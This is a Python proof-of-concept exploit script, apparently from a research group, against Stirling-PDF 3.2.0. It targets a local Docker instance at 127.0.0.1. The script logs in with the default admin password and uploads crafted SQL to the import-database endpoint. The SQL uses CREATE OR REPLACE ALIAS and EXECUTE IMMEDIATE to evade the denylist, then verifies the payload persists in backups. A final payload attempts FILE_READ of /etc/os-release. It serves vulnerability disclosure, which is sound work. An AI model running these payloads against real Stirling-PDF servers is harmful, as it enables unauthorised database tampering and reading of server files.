#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: stirling-h2-import-leftover (Critical: 9.1)
#  Vendor: Stirling-PDF (Stirling Tools)
#  Versions: Stirling-PDF 3.2.0 (a7e5937)
#  Impact: CREATE OR REPLACE ALIAS bypasses import-database denylist; backup contains attacker SQL
#  Requires: Docker, stirlingtools/stirling-pdf:3.2.0-fat, loopback 127.0.0.1:18152
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "stirling-h2-import-leftover"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove Stirling-PDF v3.2.0 H2 import-database leftover of GHSA-mrr8."""

import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from http.client import HTTPMessage
from pathlib import Path
from typing import Any
from uuid import uuid4

HERE = Path(__file__).resolve().parent
LABEL = "stirling-h2-import-leftover"
WITNESS = "STIRLING-H2-IMPORT-WITNESS"
HOST = os.environ.get("STIRLING_HOST", "127.0.0.1")
PORT = int(os.environ.get("STIRLING_PORT", "18152"))
BASE = f"http://{HOST}:{PORT}"
ADMIN_USER = "admin"
DEFAULT_PASSWORD = "stirling"
CHANGED_PASSWORD = "LabAdmin1!"
DENIED_SQL = (
    "CREATE TABLE IF NOT EXISTS lab_w(n VARCHAR);\n"
    'CREATE ALIAS IF NOT EXISTS lab_denied FOR "java.lang.Math.abs";\n'
    "INSERT INTO lab_w VALUES('should-not-import');\n"
)
ALIAS_SQL = (
    "CREATE TABLE IF NOT EXISTS lab_w(n VARCHAR);\n"
    'CREATE OR REPLACE ALIAS lab_nano FOR "java.lang.System.nanoTime";\n'
    f"INSERT INTO lab_w VALUES('{WITNESS}');\n"
)
EXECUTE_SQL = (
    "CREATE TABLE IF NOT EXISTS lab_w(n VARCHAR);\n"
    "EXECUTE IMMEDIATE 'CREATE TABLE IF NOT EXISTS lab_w(n VARCHAR)';\n"
    f"EXECUTE IMMEDIATE 'INSERT INTO lab_w VALUES(''{WITNESS}'')';\n"
)
FILE_READ_SQL = (
    "CREATE TABLE IF NOT EXISTS lab_w(n VARCHAR);\n"
    "EXECUTE IMMEDIATE 'INSERT INTO lab_w VALUES("
    "CAST(FILE_READ(''/etc/os-release'') AS VARCHAR))';\n"
)


@dataclass(frozen=True)
class HttpResponse:
    status: int
    url: str
    headers: HTTPMessage
    body: bytes

    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")

    def json(self) -> Any:
        raw = self.text()
        if not raw.strip():
            return None
        return json.loads(raw)


def log(msg: str) -> None:
    print(msg, flush=True)


def sanitize(text: str) -> str:
    return text.replace("\n", " ").replace("\r", " ")[:240]


def pick(obj: Any, *names: str) -> Any:
    if not isinstance(obj, dict):
        return None
    lowered = {str(key).lower(): value for key, value in obj.items()}
    for name in names:
        found = lowered.get(name.lower())
        if found is not None:
            return found
    return None


def encode_multipart(
    files: dict[str, tuple[str, bytes]],
) -> tuple[bytes, str]:
    boundary = f"----lab{uuid4().hex}"
    chunks: list[bytes] = []
    for field, (filename, content) in files.items():
        chunks.append(f"--{boundary}\r\n".encode("ascii"))
        chunks.append(
            (
                f'Content-Disposition: form-data; name="{field}"; '
                f'filename="{filename}"\r\n'
                "Content-Type: application/sql\r\n\r\n"
            ).encode("ascii")
        )
        chunks.append(content)
        chunks.append(b"\r\n")
    chunks.append(f"--{boundary}--\r\n".encode("ascii"))
    return b"".join(chunks), f"multipart/form-data; boundary={boundary}"


def request(
    method: str,
    path: str,
    token: str | None = None,
    json_body: dict[str, Any] | None = None,
    form: dict[str, str] | None = None,
    files: dict[str, tuple[str, bytes]] | None = None,
    timeout: int = 120,
) -> HttpResponse:
    url = path if path.startswith("http") else f"{BASE}{path}"
    headers = {"Accept": "application/json,application/octet-stream,*/*"}
    data: bytes | None = None
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if json_body is not None:
        data = json.dumps(json_body).encode("utf-8")
        headers["Content-Type"] = "application/json"
    elif form is not None:
        data = urllib.parse.urlencode(form).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    elif files is not None:
        data, content_type = encode_multipart(files)
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return HttpResponse(
                status=int(resp.status),
                url=str(resp.geturl()),
                headers=resp.headers,
                body=resp.read(),
            )
    except urllib.error.HTTPError as err:
        return HttpResponse(
            status=int(err.code),
            url=url,
            headers=err.headers or HTTPMessage(),
            body=err.read() if err.fp is not None else b"",
        )


def wait_ready(deadline: float) -> bool:
    while time.time() < deadline:
        try:
            resp = request("GET", "/api/v1/info/status", timeout=8)
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            log(f"IOC status-wait error={exc}")
            time.sleep(3)
            continue
        body = resp.text()
        log(f"IOC status-wait http={resp.status} body={sanitize(body)}")
        if resp.status == 200 and "UP" in body:
            return True
        time.sleep(3)
    return False


def login(password: str) -> HttpResponse:
    return request(
        "POST",
        "/api/v1/auth/login",
        json_body={"username": ADMIN_USER, "password": password},
        timeout=30,
    )


def extract_token(payload: Any) -> str | None:
    session = pick(payload, "session")
    token = pick(session, "access_token") if session else None
    if isinstance(token, str) and token:
        return token
    token = pick(payload, "access_token")
    return token if isinstance(token, str) and token else None


def first_login_flag(payload: Any) -> bool:
    user = pick(payload, "user")
    meta = pick(user, "user_metadata") if user else None
    flag = pick(meta, "firstLogin") if meta else None
    if flag is True:
        return True
    if isinstance(flag, str) and flag.lower() == "true":
        return True
    return False


def change_password_on_login(token: str, current: str, new: str) -> HttpResponse:
    return request(
        "POST",
        "/api/v1/user/change-password-on-login",
        token=token,
        form={
            "currentPassword": current,
            "newPassword": new,
            "confirmPassword": new,
        },
        timeout=30,
    )


def import_sql(token: str | None, sql: str, filename: str) -> HttpResponse:
    return request(
        "POST",
        "/api/v1/database/import-database",
        token=token,
        files={"fileInput": (filename, sql.encode("utf-8"))},
        timeout=180,
    )


def denied(resp: HttpResponse) -> bool:
    body = resp.text().lower()
    if resp.status in (400, 422):
        return True
    needles = (
        "disallowed",
        "illegalargument",
        "rejected",
        "unrecognized or disallowed",
        "sql script contains",
    )
    if any(n in body for n in needles):
        return True
    return False


def backup_names(payload: Any) -> list[str]:
    names: list[str] = []

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            for key, value in node.items():
                if str(key).lower() in {"filename", "file_name"} and isinstance(
                    value, str
                ):
                    names.append(value)
                else:
                    walk(value)
        elif isinstance(node, list):
            for item in node:
                walk(item)
        elif isinstance(node, str) and node.startswith("backup_") and node.endswith(
            ".sql"
        ):
            names.append(node)

    walk(payload)
    unique: list[str] = []
    seen: set[str] = set()
    for name in names:
        if name not in seen:
            seen.add(name)
            unique.append(name)
    return unique


def script_backups(names: list[str]) -> list[str]:
    script = [n for n in names if n.startswith("backup_") and not n.startswith("backup_user_")]
    script.sort(reverse=True)
    return script


def download_has_witness(token: str, file_name: str) -> tuple[bool, str]:
    resp = request(
        "GET",
        f"/api/v1/database/download/{urllib.parse.quote(file_name)}",
        token=token,
        timeout=120,
    )
    body = resp.text()
    log(
        f"IOC download file={file_name} http={resp.status} "
        f"bytes={len(resp.body)} witness={int(WITNESS in body)}"
    )
    return WITNESS in body, body


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def success(detail: str) -> int:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    return 0


def main() -> int:
    log(f"IOC run-dir={HERE.name} base={BASE}")
    ready_secs = int(os.environ.get("STIRLING_READY_SECS", "900"))
    if not wait_ready(time.time() + ready_secs):
        return fail("status-not-up")

    anon = import_sql(None, ALIAS_SQL, "anon.sql")
    log(f"IOC unauth-import http={anon.status} body={sanitize(anon.text())}")
    if anon.status not in (401, 403):
        log(f"IOC unauth-import-unexpected http={anon.status}")

    password = DEFAULT_PASSWORD
    login_resp = login(password)
    log(f"IOC login http={login_resp.status} body={sanitize(login_resp.text())}")
    if login_resp.status != 200:
        return fail(f"login http={login_resp.status}")
    payload = login_resp.json()
    token = extract_token(payload)
    if not token:
        return fail("login-missing-token")

    if first_login_flag(payload):
        changed = change_password_on_login(token, password, CHANGED_PASSWORD)
        log(
            f"IOC change-password-on-login http={changed.status} "
            f"body={sanitize(changed.text())}"
        )
        if changed.status == 200:
            password = CHANGED_PASSWORD
            login_resp = login(password)
            log(
                f"IOC relogin http={login_resp.status} "
                f"body={sanitize(login_resp.text())}"
            )
            if login_resp.status != 200:
                return fail(f"relogin http={login_resp.status}")
            token = extract_token(login_resp.json())
            if not token:
                return fail("relogin-missing-token")

    negative = import_sql(token, DENIED_SQL, "denied-alias.sql")
    log(
        f"IOC negative-import http={negative.status} "
        f"body={sanitize(negative.text())}"
    )
    if negative.status == 404:
        return fail("lite-image-missing-controller")
    if not denied(negative):
        return fail(
            f"negative-accepted http={negative.status} body={sanitize(negative.text())}"
        )

    bypass = ""
    imported = False
    for name, sql in (
        ("create-or-replace-alias", ALIAS_SQL),
        ("execute-immediate", EXECUTE_SQL),
    ):
        resp = import_sql(token, sql, f"{name}.sql")
        log(
            f"IOC leftover-import bypass={name} http={resp.status} "
            f"body={sanitize(resp.text())}"
        )
        if resp.status == 200:
            bypass = name
            imported = True
            break
        log(f"IOC leftover-rejected bypass={name}")

    if not imported:
        return fail("leftover-sql-still-400")

    backup = request(
        "GET", "/api/v1/database/createDatabaseBackup", token=token, timeout=180
    )
    log(f"IOC create-backup http={backup.status} body={sanitize(backup.text())}")
    if backup.status != 200:
        return fail(f"create-backup http={backup.status}")

    listed = request(
        "GET", "/api/v1/proprietary/ui-data/database", token=token, timeout=60
    )
    log(f"IOC ui-data-database http={listed.status} body={sanitize(listed.text())}")
    names: list[str] = []
    if listed.status == 200:
        try:
            names = backup_names(listed.json())
        except json.JSONDecodeError:
            names = []
    log(f"IOC backup-names {names}")

    witness_found = False
    chosen = ""
    for file_name in script_backups(names):
        has, _body = download_has_witness(token, file_name)
        if has:
            witness_found = True
            chosen = file_name
            break
    if not witness_found:
        for file_name in names:
            has, _body = download_has_witness(token, file_name)
            if has:
                witness_found = True
                chosen = file_name
                break
    if not witness_found:
        return fail("backup-missing-witness")

    extra = import_sql(token, FILE_READ_SQL, "file-read.sql")
    log(
        f"IOC extra-file-read-import http={extra.status} "
        f"body={sanitize(extra.text())}"
    )
    if extra.status == 200:
        request("GET", "/api/v1/database/createDatabaseBackup", token=token, timeout=180)
        listed = request(
            "GET", "/api/v1/proprietary/ui-data/database", token=token, timeout=60
        )
        extra_names = backup_names(listed.json()) if listed.status == 200 else names
        for file_name in script_backups(extra_names) or extra_names:
            _has, body = download_has_witness(token, file_name)
            blob = body.lower()
            if "ubuntu" in blob or "noble" in blob:
                log(f"IOC extra-os-release file={file_name} ubuntu-or-noble=yes")
                break

    return success(
        "negative-denied=yes "
        f"bypass={bypass} backup-has-witness=yes file={chosen} "
        f"unauth-import={anon.status}"
    )


if __name__ == "__main__":
    raise SystemExit(main())

